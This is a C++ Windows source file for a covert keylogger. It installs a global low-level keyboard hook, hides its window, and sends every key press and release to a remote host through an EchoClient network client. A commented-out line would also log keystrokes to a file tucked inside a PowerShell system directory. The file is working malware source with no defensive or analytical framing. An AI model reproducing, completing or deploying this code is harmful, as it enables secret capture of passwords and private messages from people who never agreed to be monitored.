#include <iostream>
#include <string>
#include <map>
#include <stdlib.h>
#include "../EchoClient.h"
#include "../vkCodeLisk.h"


//std::ofstream fout;
EchoClient* client;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL fEatKeystroke = FALSE;

	if (nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			//fout << vkCodeList[p->vkCode].c_str() << std::endl;
			client->sendString(vkCodeList[p->vkCode] + "\n");
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			//fout << vkCodeList[p->vkCode].c_str() << " UP" << std::endl;
			client->sendString(vkCodeList[p->vkCode] + " UP\n");
			break;
		}
	}
	return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
	, LPSTR lpszCmdParam, int nCmdShow)
{
		client = new EchoClient;

	HWND hWnd;

	hWnd = CreateWindow(L"SWAG", L"SWAG", WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, (HMENU)NULL, hInstance, NULL);

	ShowWindow(hWnd, HIDE_WINDOW);

	//fout.open("C:\\Program Files\\WindowsPowerShell\\Configuration\\Registration\\a.txt", std::ios::out | std::ios::app);

	// Install the low-level keyboard & mouse hooks
	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

	// Keep this app running until we're told to stop
	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hhkLowLevelKybd);

	return(0);
}
